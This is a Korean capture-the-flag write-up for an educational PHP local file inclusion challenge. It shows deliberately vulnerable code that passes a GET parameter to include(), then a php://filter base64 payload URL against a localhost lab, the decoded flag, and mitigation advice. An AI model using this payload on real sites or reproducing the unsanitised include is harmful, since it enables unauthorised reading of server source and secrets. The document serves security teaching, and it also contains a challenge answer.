# [injection] LFI #1 — 기본 라이트업

- 대상: `arang-edu-challs-collection` / `challenges/injection/lfi-1`
- 카테고리: injection
- 버그클래스: Local File Inclusion (LFI)
- 포트: 9204

## 취약점 분석

`challenges/injection/lfi-1/html/index.php`:

```php
<?php
# flag 는 lfiflag.php 안에 있습니다 (그냥 include 하면 실행되어 안 보임 → 소스를 읽으세요)
if (!isset($_GET["p"])) { include 'home.php'; }
else { include $_GET["p"]; }   // LFI
?>
```

`p` 파라미터를 검증 없이 `include()`에 그대로 전달한다. flag는 `lfiflag.php` 파일 안에 PHP 코드로 저장되어 있는데, 이 파일을 그냥 `include`하면 PHP로 **실행**되어버려 `$flag` 변수 값이 응답에 출력되지 않는다(변수 대입문은 화면에 아무것도 안 찍음). 소스 코드 자체를 텍스트로 읽어내야 하므로 `php://filter` 래퍼로 base64 인코딩해서 가져온다.

## 익스플로잇

```
http://localhost:9204/?p=php://filter/convert.base64-encode/resource=lfiflag.php
```

`php://filter/convert.base64-encode/resource=파일명`은 대상 파일을 실행하지 않고 base64로 인코딩된 텍스트로 반환한다(PHP 코드가 실행되지 않으므로 소스 원문을 그대로 읽어올 수 있음).

응답으로 받은 base64 문자열:
```
PD9waHAKJGZsYWcgPSAiZmxhZ3tiNjAxYmYxYjQ5OTgxYjFmM2EwMn0iOwo=
```

디코딩:
```bash
echo "PD9waHAKJGZsYWcgPSAiZmxhZ3tiNjAxYmYxYjQ5OTgxYjFmM2EwMn0iOwo=" | base64 -d
```
```php
<?php
$flag = "flag{b601bf1b49981b1f3a02}";
```

## 진행 절차

1. `docker compose up -d --build lfi-1 db`
2. `http://localhost:9204/?p=php://filter/convert.base64-encode/resource=lfiflag.php` 접속
3. 응답의 base64 문자열을 `base64 -d`로 디코딩 → flag 확인

## 플래그

```
flag{b601bf1b49981b1f3a02}
```

## 대응방안

- `include`/`require` 대상 경로는 사용자 입력을 직접 받지 않고, 화이트리스트(허용된 페이지 목록)로만 매핑
- `allow_url_include`, `allow_url_fopen` 비활성화로 원격 파일 포함(RFI) 및 일부 래퍼 오남용 차단
- 파일 경로에 사용자 입력이 꼭 필요하다면 경로 정규화 후 허용 디렉터리 밖으로 벗어나지 않는지(경로 순회 방지) 엄격히 검증
